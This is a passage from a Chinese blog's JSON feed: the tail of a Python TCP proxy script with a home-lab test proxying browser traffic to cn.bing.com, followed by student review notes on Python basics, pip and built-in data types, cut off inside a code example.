data-num=\"202\"></td><td><pre></pre></td></tr><tr><td data-num=\"203\"></td><td><pre>    <span class=\"token comment\"># 设置本地监听参数</span></pre></td></tr><tr><td data-num=\"204\"></td><td><pre>    local_host <span class=\"token operator\">=</span> sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"205\"></td><td><pre>    local_port <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"206\"></td><td><pre></pre></td></tr><tr><td data-num=\"207\"></td><td><pre>    <span class=\"token comment\"># 设置远程目标</span></pre></td></tr><tr><td data-num=\"208\"></td><td><pre>    remote_host <span class=\"token operator\">=</span> sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"209\"></td><td><pre>    remote_port <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"210\"></td><td><pre></pre></td></tr><tr><td data-num=\"211\"></td><td><pre>    <span class=\"token comment\">#  这告诉我们的代理连接和接收数据</span></pre></td></tr><tr><td data-num=\"212\"></td><td><pre>    <span class=\"token comment\">#  在发送到目标主机之前</span></pre></td></tr><tr><td data-num=\"213\"></td><td><pre>    receive_first <span class=\"token operator\">=</span> sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"214\"></td><td><pre></pre></td></tr><tr><td data-num=\"215\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token string\">\"True\"</span> <span class=\"token keyword\">in</span> receive_first<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"216\"></td><td><pre>        receive_first <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"217\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"218\"></td><td><pre>        receive_first <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"219\"></td><td><pre></pre></td></tr><tr><td data-num=\"220\"></td><td><pre>    <span class=\"token comment\"># 现在打开监听套接字</span></pre></td></tr><tr><td data-num=\"221\"></td><td><pre>    server_loop<span class=\"token punctuation\">(</span>local_host<span class=\"token punctuation\">,</span> local_port<span class=\"token punctuation\">,</span> remote_host<span class=\"token punctuation\">,</span> remote_port<span class=\"token punctuation\">,</span> receive_first<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"222\"></td><td><pre></pre></td></tr><tr><td data-num=\"223\"></td><td><pre></pre></td></tr><tr><td data-num=\"224\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"225\"></td><td><pre>    main<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"测试代码\"><a class=\"anchor\" href=\"#测试代码\">#</a> 测试代码</h1>\n<p>环境：win10 物理机、kali linux 虚拟机 IP 地址为 192.168.199.128、谷歌浏览器与代理插件。</p>\n<p>在 kali 上运行代码：<br />\n <code>Python3 TCP_Proxy.py 192.168.199.128 8080 cn.bing.com 80 True</code></p>\n<p>在谷歌浏览器上打开代理<br />\n<img data-src=\"image003.png\" alt=\"\" /></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3huLS1jbi1iNDdjcDI4ZmtzNWFqcWNvdnouYmluZy5jb20=\">浏览器访问 cn.bing.com</span><br />\nkali 上显示的信息<br />\n先查看连接<br />\n（左边为 Windows 的 cmd 右边为 Kali 的 shell）<br />\n<img data-src=\"image002.png\" alt=\"\" /></p>\n<p>在看数据包<br />\n（这里不知道为什么是坏的数据包）<br />\n<img data-src=\"image004.png\" alt=\"\" /></p>\n<p>有些问题，等过段时间再解决。</p>\n<h1 id=\"参考\"><a class=\"anchor\" href=\"#参考\">#</a> 参考</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNTQ5MDcwL2FydGljbGUvZGV0YWlscy8xMDgxOTM1Mzc=\">https://blog.csdn.net/qq_40549070/article/details/108193537</span></p>\n<p>使用 ctype 获取线程 id<br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3RqY3d0MjAxMS9hcnRpY2xlL2RldGFpbHMvODA4ODU0MTA=\">https://blog.csdn.net/tjcwt2011/article/details/80885410</span><br />\n<span class=\"exturl\" data-url=\"aHR0cDovL3hpYW9ydWkuY2MvYXJjaGl2ZXMvMzAxNw==\">http://xiaorui.cc/archives/3017</span></p>\n",
            "tags": [
                "python"
            ]
        },
        {
            "id": "https://or0kit.github.io/Programming/Python/python-%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/",
            "url": "https://or0kit.github.io/Programming/Python/python-%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/",
            "title": "python 期末复习",
            "date_published": "2020-12-18T08:53:24.000Z",
            "content_html": "<h1 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h1>\n<blockquote>\n<p>老师怕学生考试挂科，额外安排了一节课讲考试范围和题型（泄题 (｀・ω・´)）。就喜欢这样的老师！<br />\n权当巩固一下咯，仅供自己复习用。<br />\n仅仅是一些考点。</p>\n</blockquote>\n<h1 id=\"python简介\"><a class=\"anchor\" href=\"#python简介\">#</a> Python 简介</h1>\n<p>Python，读作 ['paɪθɑn], 汉语是蟒蛇，Python 的 logo 是两条缠绕在一起的蟒蛇.</p>\n<p>Python 语言是由荷兰程序员 Guido van Rossum，独立开发完成初版的。之所以选中 Python 作为该编程语言的名字，是因为他是一个叫 Monty Python 喜剧团体的爱好者，其本意并不是想选条蟒蛇。</p>\n<h1 id=\"python语言的特点\"><a class=\"anchor\" href=\"#python语言的特点\">#</a> Python 语言的特点</h1>\n<blockquote>\n<p>Emma 这些基础特点到是忘了不少。</p>\n</blockquote>\n<p><strong>简单易学、明确优雅、开发速度快 跨平台、可移植、可扩展、交互式、解释型、面向对象的动态语言，丰富的库，开源</strong></p>\n<ul>\n<li>跨平台：Python 支持 Windows、Linux 和 MAC os 等主流操作系统。</li>\n<li>可移植：代码通常不需要多少改动就能移植到别的平台上使用。</li>\n<li>可扩展：Python 语言本身由 C 语言编写而成的，你完全可以在 Python 中嵌入 C，从而提高代码的运行速度和效率。你也可以使用 C 语言重写 Python 的任何模块，从根本上改写 Python，PyPy 就是这么干的。</li>\n<li>交互式：Python 提供很好的人机交互界面，比如 IDLE 和 IPython。可以从终端输入执行代码并获得结果，互动的测试和调试代码片断。</li>\n<li>解释型：Python 语言在执行过程中由解释器逐行分析，逐行运行并输出结果。</li>\n<li>面向对象：Python 语言具备所有的面向对象特性和功能，支持基于类的程序开发。</li>\n<li>动态语言：在运行时可以改变其结构。例如新的函数、对象、甚至代码可以被引进，已有的函数可以被删除或是其他结构上的变化。动态语言非常具有活力。</li>\n</ul>\n<h2 id=\"内置电池大量的标准库和第三方库\"><a class=\"anchor\" href=\"#内置电池大量的标准库和第三方库\">#</a> “内置电池”，大量的标准库和第三方库</h2>\n<p>Python 为我们提供了非常完善的基础库，覆盖了系统、网络、文件、GUI、数据库、文本处理等方方面面，这些是随同解释器被默认安装的，各平台通用，你无需安装第三方支持就可以完成大多数工作，这一特点被形象地称作 “内置电池（batteries included）”。</p>\n<p>有一句话叫做 “不要重复造轮子”。不要过分迷信自己的代码能力，要知道，能作为标准库被 Python 内置，必然在可靠性和算法效率上达到了目前最高水平，能被广泛使用的第三方库，必然也是经受了大量的应用考验。那些造轮子的事情，就交给世界最顶尖的那一波程序员去干吧，没有极致的思维和数学能力，想创造好用的轮子是很难的。</p>\n<h2 id=\"社区活跃贡献者多互帮互助\"><a class=\"anchor\" href=\"#社区活跃贡献者多互帮互助\">#</a> 社区活跃，贡献者多，互帮互助</h2>\n<p>国外有好多，在国内，好像没有比较成熟，因此学好英语，去和世界范围的程序员交流吧！</p>\n<h2 id=\"开源语言发展动力巨大\"><a class=\"anchor\" href=\"#开源语言发展动力巨大\">#</a> 开源语言，发展动力巨大</h2>\n<p>Python 是基于 C 语言编写的，并且使用 GPL 开源协议，你可以免费获取它的源代码，进行学习、研究甚至改进。众人拾柴火焰高，有更多的人参与 Python 的开发，促使它更好的发展，被更多的应用，形成良性循环。Python 为什么会越来越火就是因为它的开放性，自由性，聚起了人气，形成了社区，有很多人在其中做贡献，用的人越来越多，自然就提高了市场占有率，企业、公司、厂家就不得不使用 Python，提供的 Python 程序员岗位就越来越多，这就是开源的力量。</p>\n<h1 id=\"python的应用方向\"><a class=\"anchor\" href=\"#python的应用方向\">#</a> Python 的应用方向</h1>\n<ol>\n<li>\n<p>常规软件开发<br />\n Python 支持函数式编程和 OOP 面向对象编程，能够承担任何种类软件的开发工作，因此常规的软件开发、脚本编写、网络编程等都属于标配能力。</p>\n</li>\n<li>\n<p>科学计算<br />\n随着 NumPy, SciPy, Matplotlib, Enthought librarys 等众多程序库的开发，Python 越来越适合于做科学计算、绘制高质量的 2D 和 3D 图像。和科学计算领域最流行的商业软件 Matlab 相比，Python 是一门通用的程序设计语言，比 Matlab 所采用的脚本语言的应用范围更广泛，有更多的程序库的支持。虽然 Matlab 中的许多高级功能和 toolbox 目前还是无法替代的，不过在日常的科研开发之中仍然有很多的工作是可以用 Python 代劳的。</p>\n</li>\n<li>\n<p>自动化运维<br />\n这几乎是 Python 应用的自留地，作为运维工程师首选的编程语言，Python 在自动化运维方面已经深入人心，比如 Saltstack 和 Ansible 都是大名鼎鼎的自动化平台。</p>\n</li>\n<li>\n<p>云计算<br />\n开源云计算解决方案 OpenStack 就是基于 Python 开发的，搞云计算的同学都懂的。</p>\n</li>\n<li>\n<p>WEB 开发<br />\n基于 Python 的 Web 开发框架不要太多，比如耳熟能详的 Django，还有 Tornado，Flask。其中的 Python+Django 架构，应用范围非常广，开发速度非常快，学习门槛也很低，能够帮助你快速的搭建起可用的 WEB 服务。</p>\n</li>\n<li>\n<p>网络爬虫<br />\n也称网络蜘蛛，是大数据行业获取数据的核心工具。没有网络爬虫自动地、不分昼夜地、高智能地在互联网上爬取免费的数据，那些大数据相关的公司恐怕要少四分之三。能够编写网络爬虫的编程语言有不少，但 Python 绝对是其中的主流之一，其 Scripy 爬虫框架应用非常广泛。</p>\n</li>\n<li>\n<p>数据分析<br />\n在大量数据的基础上，结合科学计算、机器学习等技术，对数据进行清洗、去重、规格化和针对性的分析是大数据行业的基石。Python 是数据分析的主流语言之一。</p>\n</li>\n<li>\n<p>人工智能<br />\n Python 在人工智能大范畴领域内的机器学习、神经网络、深度学习等方面都是主流的编程语言，得到广泛的支持和应用。</p>\n</li>\n</ol>\n<p>当然，除了以上的主流和前沿领域，Python 还在其他传统或特殊行业起着重要的作用。</p>\n<h1 id=\"python包管理工具\"><a class=\"anchor\" href=\"#python包管理工具\">#</a> Python 包管理工具</h1>\n<p>Python 有两个著名的包管理工具 easy_install 和 pip。在 Python2.7 的安装包中，easy_install 是默认安装的，而 pip 需要我们手动安装。随着 Python 版本的提高，easy_install 已经逐渐被淘汰，但是一些比较老的第三方库，在现在仍然只能通过 easy_install 进行安装。目前，pip 已经成为主流的安装工具，自 Python2 &gt;=2.7.9 或者 Python3.4 以后默认都安装有 pip。</p>\n<p>就如同 Python 有 2、2.7、3、3.6 一样，pip 也有 pip、pip2、pip3 之分。pip 是从属于 Python 的，对应的 pip 负责给对应的 Python 安装第三方模块。我们不要关心 pip 后面跟的数字，核心的问题是这个 pip 命令对应的是哪个 Python 解释器，想要为哪个 Python 解释器安装第三方库，就要调用它名下对应的 pip。</p>\n<p>如何确定哪个 pip 是哪个 Python 的呢？</p>\n<p>cmd 环境中，输入 pip -V (大写 V)：<br />\n<img data-src=\"image001.png\" alt=\"\" /></p>\n<h2 id=\"pip的使用\"><a class=\"anchor\" href=\"#pip的使用\">#</a> pip 的使用</h2>\n<ol>\n<li>普通安装<br />\n<em>再次强调，使用 pip 前请务必确认其所对应的 Python 解释器必须是你想要的那个！</em></li>\n</ol>\n<p>以安装 pillow 模块为例。输入 pip install pillow。</p>\n<ol start=\"2\">\n<li>\n<p>指定版本安装<br />\n安装特定版本的 package，通过使用 ==, &gt;=, &lt;=,&gt;, &lt; 来指定一个版本号。<br />\npip install 'Markdown&lt;2.0'<br />\npip install 'Markdown&gt;2.0,&lt;2.0.3</p>\n</li>\n<li>\n<p>卸载已安装的库<br />\n pip uninstall pillow</p>\n</li>\n<li>\n<p>列出已经安装的库<br />\n pip list</p>\n</li>\n<li>\n<p>将已经安装的库列表保存到文本文件中<br />\n pip freeze &gt; requirements.txt</p>\n</li>\n</ol>\n<p>这个功能非常常用、好用！经常被用作项目环境依赖文件。</p>\n<ol start=\"6\">\n<li>根据依赖文件批量安装库<br />\n pip install -r requirements.txt</li>\n</ol>\n<p>使用上面的 txt 文件，批量安装第三方库。</p>\n<h1 id=\"python的virtualenv-虚拟环境\"><a class=\"anchor\" href=\"#python的virtualenv-虚拟环境\">#</a> Python 的 virtualenv 虚拟环境</h1>\n<p>这部分不考，详细内容见<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGl1amlhbmdibG9nLmNvbS9jb3Vyc2UvcHl0aG9uLzY=\"> https://www.liujiangblog.com/course/python/6</span></p>\n<h1 id=\"python基础\"><a class=\"anchor\" href=\"#python基础\">#</a> Python 基础</h1>\n<h2 id=\"缩进\"><a class=\"anchor\" href=\"#缩进\">#</a> 缩进</h2>\n<p>python 的灵魂就是使用缩进来表示代码块，不需要使用大括号 {} 。<br />\n缩进的空格数是可变的，但是同一个代码块的语句必须包含相同的缩进空格数。</p>\n<h2 id=\"注释\"><a class=\"anchor\" href=\"#注释\">#</a> 注释</h2>\n<p>Python 中单行注释以 # 开头<br />\n多行注释可以用多个 # 号，还有 ''' 和 &quot;&quot;&quot;</p>\n<h2 id=\"python自带的集成开发环境\"><a class=\"anchor\" href=\"#python自带的集成开发环境\">#</a> Python 自带的集成开发环境</h2>\n<p><strong>IDLE</strong></p>\n<h2 id=\"python变量的命名规则\"><a class=\"anchor\" href=\"#python变量的命名规则\">#</a> Python 变量的命名规则</h2>\n<p>变量名可以包括字母、数字、下划线，但不能以数字开头。区分大小写。</p>\n<h2 id=\"python-pass-语句\"><a class=\"anchor\" href=\"#python-pass-语句\">#</a> Python pass 语句</h2>\n<p>Python pass 是空语句，是为了保持程序结构的完整性。</p>\n<p>pass 不做任何事情，一般用做占位语句。</p>\n<h2 id=\"为什么说python采用的是基于值的内存管理模式\"><a class=\"anchor\" href=\"#为什么说python采用的是基于值的内存管理模式\">#</a> 为什么说 Python 采用的是基于值的内存管理模式？</h2>\n<p>Python 中的变量并不直接存储值，而是存储了值的内存地址或者引用，假如为不同变量赋值为相同值，这个值在内存中只有一份，多个变量指向同一块内存地址。</p>\n<h3 id=\"gossip闲聊脚本语言与编程语言的区别\"><a class=\"anchor\" href=\"#gossip闲聊脚本语言与编程语言的区别\">#</a> Gossip (闲聊) 脚本语言与编程语言的区别</h3>\n<p>脚本语言与编程语言的区别有：<br />\n1、脚本语言不需要编译器，省去编译过程；而编程语言需要编译器。<br />\n2、脚本语言是动态的，可以实时更改代码；而编程语言不可以实时更改代码。<br />\n3、脚本语言易学，但缺乏系统性；编程语言较为成熟。</p>\n<p>脚本语言和编程语言比较</p>\n<p>（1）脚本语言不需要编译器因而省去了编译的过程减少了开发的时间，而编程语言需要编译所以时间更长点</p>\n<p>（2）脚本语言是一种动态语言，也就是说可以实时的更改代码，而不需要将程序停止下来，这是一种高级特性。而 Java 等编程语言是静态的语言，一旦编译完成并且运行就不能更改代码，除非将程序停止下来</p>\n<p>（3）脚本语言非常容易学习，但是不够全面缺乏系统性而且语法较为散漫。而高级编程语言虽然相对难学，但是规则强可以编程出简洁美观的代码，并且可读性也相对较强。</p>\n<p>（4）一般来说脚本语言通用性较差，但是可以通过专门的应用来调整。</p>\n<p>（5）随着技术的发展，其实脚本语言变得越来越强，和编程语言的界限也比较模糊，比如 Python，可以将它视为编程语言了，因为它很强大。</p>\n<p>转载自<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucGhwLmNuL2ZhcS80MTY3MTIuaHRtbA==\"> https://www.php.cn/faq/416712.html</span></p>\n<h2 id=\"is-与-的区别\"><a class=\"anchor\" href=\"#is-与-的区别\">#</a> is 与 == 的区别</h2>\n<p>&quot;is&quot; 作为判断地址是否相等，即判断两个变量是否指向同一内存地址<br />\n &quot;==&quot; 判断两个变量的值是否相等<br />\n同样的，&quot;is not&quot; 和 &quot;!=&quot; 遵循同样的逻辑</p>\n<h2 id=\"数据类型\"><a class=\"anchor\" href=\"#数据类型\">#</a> 数据类型</h2>\n<h3 id=\"可变数据类型\"><a class=\"anchor\" href=\"#可变数据类型\">#</a> 可变数据类型</h3>\n<h4 id=\"列表list\"><a class=\"anchor\" href=\"#列表list\">#</a> 列表 (list)</h4>\n<p>列表的系列函数：</p>\n<p>①append (): 元素的追加，在列表的末尾添加新的值 列表名.append (新增的值)</p>\n<p>②insert (下标，值)：在指定下标插入指定的值 列表名.insert (下标，值)</p>\n<p>③count (值)：求指定元素在列表中出现的次数 列表名.count (值)</p>\n<p>④pop (下标)：从列表中根据下标移除指定位置的值 列表名.pop (下标)<br />\n（pop 删除元素，是将元素从列表移除，但依然存在于内存，如需使用，使用变量接收）</p>\n<p>⑤remove (值)：从列表中根据值来删除掉指定的元素<br />\n（如果列表中存在重复的元素，删除的时候，仅仅删除第一个）<br />\n⑥sort ()：排序，从小到大 .<br />\n 若需要实现从大到小，需要添加关键字参数 reverse=True 列表名.sort (reverse=True)<br />\n⑦sorted ()：临时排序 sorted (列表名)</p>\n<p>⑧reverse ()：翻转 列表名.reverse ()</p>\n<p>⑨extend ()：列表的扩展 / 列表的拼接 列表名.extend (列表)</p>\n<p>⑩index (值)：获取列表中指定元素的下标 列表名.index (值)</p>\n<h4 id=\"字典dict\"><a class=\"anchor\" href=\"#字典dict\">#</a> 字典 (dict)</h4>\n<p>字典的系列函数：</p>\n<p>①dict (): 映射到另一个字典：字典名 = dict (字典名)<br />\n 通过序列创建字典：字典名 = dict (序列) #序列位置只能传入序列，因字典数据格式是键值对 ，所以序列中的每一个元素中应该包含两个值 eg. [(1,2),3,4]</p>\n<p>②fromkeys (): 多个 key 共用一个值 dict.fromkeys (key 的序列，值)</p>\n<p>③keys ()：获取字典中所有的 key，以形式列表返回 字典名.keys ()</p>\n<p>④values ()：获取字典中所有的 value，以实行列表返回 字典名.values ()</p>\n<p>⑤get (key, default)：根据 key，获取指定的 value 字典名.get (key, 提示信息)</p>\n<p>⑥pop (key，default)：根据 key，删除这个 key 的键值对 字典名.pop (key, 提示信息)</p>\n<p>⑦clear ()：清空字典中所有的键值对，只保留空字典 字典名.clear ()</p>\n<p>⑧del：删除字典 del 字典名</p>\n<p>⑨update ()：字典的更新 / 字典的拼接 字典名.update (字典名)</p>\n<p>字典新增数据：字典名 [key] = value<br />\n（key 存在，修改字典中 key 原有的 value key 不存在，在字典中新增一个键值对）</p>\n<h3 id=\"不可变数据类型\"><a class=\"anchor\" href=\"#不可变数据类型\">#</a> 不可变数据类型</h3>\n<p>不可变数据类型的函数都不会改变数据的值，所以需要添加一个值来接受</p>\n<h4 id=\"数字\"><a class=\"anchor\" href=\"#数字\">#</a> 数字</h4>\n<pre><code>整型：int\n浮点型：float\nbool:True、False\n复数：complex\n</code></pre>\n<h4 id=\"字符串\"><a class=\"anchor\" href=\"#字符串\">#</a> 字符串</h4>\n<p>字符串系列函数：</p>\n<p>①replace ()：替换字符串中的内容为新的字符串内容 字符串.replace (旧字符，新字符，替换次数) #替换次数默认为全部替换<br />\n②upper ()：字符串中所有的字符全部转换为大写<br />\n③lower (): 字符串中所有的字符串全部转换为小写<br />\n④len ()：求字符串的长度 len (字符串)<br />\n⑤split (切割字符)：将字符串按照自定的字符进行切割，返回一个列表<br />\n eg. a = ‘abcde’ b = a.split (‘c’) (结果) b=[‘ab’,’def’]<br />\n⑥capitalize ()：大写字符串的第一个字符<br />\n⑦title ()：大写字符串中每一个单词的首字母<br />\n⑧index ()：返回字符串中指定元素的下标，如果有重复的元素，返回第一个元素的下标</p>\n<h4 id=\"元组\"><a class=\"anchor\" href=\"#元组\">#</a> 元组</h4>\n<p>符号：()<br />\n 关键字：tuple<br />\n 创建 只有一个值的元组的时候，要在元素后面加一个逗号：元组名 = （1，）<br />\n元组函数：<br />\n①tuple ()：创建元素，实现其他数据类型转换为元组<br />\n②count ()：统计元组中指定元素出现的次数<br />\n③index ()：求出元组内指定元素的下标</p>\n<h4 id=\"集合\"><a class=\"anchor\" href=\"#集合\">#</a> 集合</h4>\n<p>符号：{}<br />\n 关键字：set<br />\n 创建空集合时用小括号：set ()<br />\n 特点：无需不重复<br />\n举例：<br />\nset1 = {1,2,3}<br />\n 或 set2 = set (‘hello’)<br />\n set2 的输出结果：{‘o’,‘e’，‘h’，‘l} #此结果不唯一，满足无需不重复特点即可</p>\n<h3 id=\"元组与列表的区别\"><a class=\"anchor\" href=\"#元组与列表的区别\">#</a> 元组与列表的区别</h3>\n<p>转载自<span class=\"exturl\" data-url=\"aHR0cDovL2MuYmlhbmNoZW5nLm5ldC92aWV3LzQzNjMuaHRtbA==\"> http://c.biancheng.net/view/4363.html</span></p>\n<p>考试只要知道列表中的元素可以修改，元组中的元素不可以修改就行了</p>\n<p>元组和列表同属序列类型，且都可以按照特定顺序存放一组数据，数据类型不受限制，只要是 Python 支持的数据类型就可以。那么，元组和列表有哪些区别呢？</p>\n<p>元组和列表最大的区别就是，列表中的元素可以进行任意修改，就好比是用铅笔在纸上写的字，写错了还可以擦除重写；而元组中的元素无法修改，除非将元组整体替换掉，就好比是用圆珠笔写的字，写了就擦不掉了，除非换一张纸。<br />\n可以理解为，tuple 元组是一个只读版本的 list 列表。</p>\n<p>需要注意的是，这样的差异势必会影响两者的存储方式，我们来直接看下面的例子：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> listdemo <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> listdemo<span class=\"token punctuation\">.</span>__sizeof__<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token number\">40</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> tupleDemo <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> tupleDemo<span class=\"token punctuation\">.</span>__sizeof__<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token number\">24</span></pre></td></tr></table></figure><p>可以看到，对于列表和元组来说，虽然它们都是空的，但元组却比列表少占用 16 个字节，这是为什么呢？</p>\n<p>事实上，就是由于列表是动态的，它需要存储指针来指向对应的元素（占用 8 个字节）。另外，由于列表中元素可变，所以需要额外存储已经分配的长度大小（占用 8 个字节）。但是对于元组，情况就不同了，元组长度大小固定，且存储元素不可变，所以存储空间也是固定的。</p>\n<p>读者可能会问题，既然列表这么强大，还要元组这种序列类型干什么？</p>\n<p>通过对比列表和元组存储方式的差异，我们可以引申出这样的结论，即元组要比列表更加轻量级，所以从总体上来说，元组的性能速度要由于列表。</p>\n<p>另外，Python 会在后台，对静态数据做一些资源缓存。通常来说，因为垃圾回收机制的存在，如果一些变量不被使用了，Python 就会回收它们所占用的内存，返还给操作系统，以便其他变量或其他应用使用。</p>\n<p>但是对于一些静态变量（比如元组），如果它不被使用并且占用空间不大时，Python 会暂时缓存这部分内存。这样的话，当下次再创建同样大小的元组时，Python 就可以不用再向操作系统发出请求去寻找内存，而是可以直接分配之前缓存的内存空间，这样就能大大加快程序的运行速度。</p>\n<p>下面的例子，是计算初始化一个相同元素的列表和元组分别所需的时间。我们可以看到，元组的初始化速度要比列表快 5 倍。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>C<span class=\"token punctuation\">:</span>\\Users\\mengma<span class=\"token operator\">></span>python <span class=\"token operator\">-</span>m timeit <span class=\"token string\">'x=(1,2,3,4,5,6)'</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token number\">20000000</span> loops<span class=\"token punctuation\">,</span> best of <span class=\"token number\">5</span><span class=\"token punctuation\">:</span> <span class=\"token number\">9.97</span> nsec per loop</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>C<span class=\"token punctuation\">:</span>\\Users\\mengma<span class=\"token operator\">></span>python <span class=\"token operator\">-</span>m timeit <span class=\"token string\">'x=[1,2,3,4,5,6]'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token number\">5000000</span> loops<span class=\"token punctuation\">,</span> best of <span class=\"token number\">5</span><span class=\"token punctuation\">:</span> <span class=\"token number\">50.1</span> nsec per loop</pre></td></tr></table></figure><p>当然，如果你想要增加、删减或者改变元素，那么列表显然更优。因为对于元组来说，必须得通过新建一个元组来完成。</p>\n<p>总的来说，元组确实没有列表那么多功能，但是元组依旧是很重要的序列类型之一，元组的不可替代性体现在以下这些场景中：</p>\n<p>元组作为很多内置函数和序列类型方法的返回值存在，也就是说，在使用某些函数或者方法时，它的返回值会元组类型，因此你必须对元组进行处理。<br />\n元组比列表的访问和处理速度更快，因此，当需要对指定元素进行访问，且不涉及修改元素的操作时，建议使用元组。<br />\n元组可以在映射（和集合的成员）中当做 “键” 使用，而列表不行。这会在后续章节中作详解介绍。</p>\n<h3 id=\"列表用和append区别\"><a class=\"anchor\" href=\"#列表用和append区别\">#</a> 列表用‘+’和‘append’区别</h3>\n<p>转载自<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NzI5NTc4L2FydGljbGUvZGV0YWlscy8xMDQ5Njg5MjI=\"> https://blog.csdn.net/qq_44729578/article/details/104968922</span></p>\n<p>本质分析<br />\n本质是否相同<br />\n代码分析：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>t<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>t1<span class=\"token operator\">=</span>t<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>t2<span class=\"token operator\">=</span>t<span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>t1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>t2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">##### 输出结果</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token boolean\">None</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token 